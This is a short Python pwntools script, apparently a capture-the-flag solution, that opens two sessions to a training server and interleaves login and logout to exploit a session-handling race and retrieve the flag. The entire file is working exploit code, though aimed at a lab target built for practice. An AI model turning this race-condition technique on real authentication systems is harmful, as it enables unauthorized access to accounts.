from pwn import *

def get_token(c):
    c.recvuntil(b'token: ')
    return c.recvline().strip()

def login(c):
    c.recvuntil(b'> ')
    c.sendline(b'1')
    c.recvuntil(b'Enter username: ')
    c.sendline(b'user')
    c.sendline(b'supersecurepassword')

def logout(c):
    c.recvuntil(b'> ')
    c.sendline(b'2')
    
def get_flag(c):
    c.recvuntil(b'> ')
    c.sendline(b'4')
    c.recvline()
    return c.recvline().strip()

c_token = remote('underprivileged.training.offensivedefensive.it', 8080, ssl = True)

token = get_token(c_token)
print(f'token: {token}')
c_token.close()

c_1 = remote('private.training.offensivedefensive.it', 8080, ssl = True)
c_1.recvuntil(b'Token: ')
c_1.sendline(token)
c_2 = remote('private.training.offensivedefensive.it', 8080, ssl = True)
c_2.recvuntil(b'Token: ')
c_2.sendline(token)

while(1):
    login(c_1)
    #c_1.recvuntil(b'< ')
    #c_2.recvuntil(b'< ')
    #c_1.sendline(b'2')
    #c_2.sendline(b'2')
    logout(c_1)
    logout(c_2)
    print(f'flag: {get_flag(c_1)}')
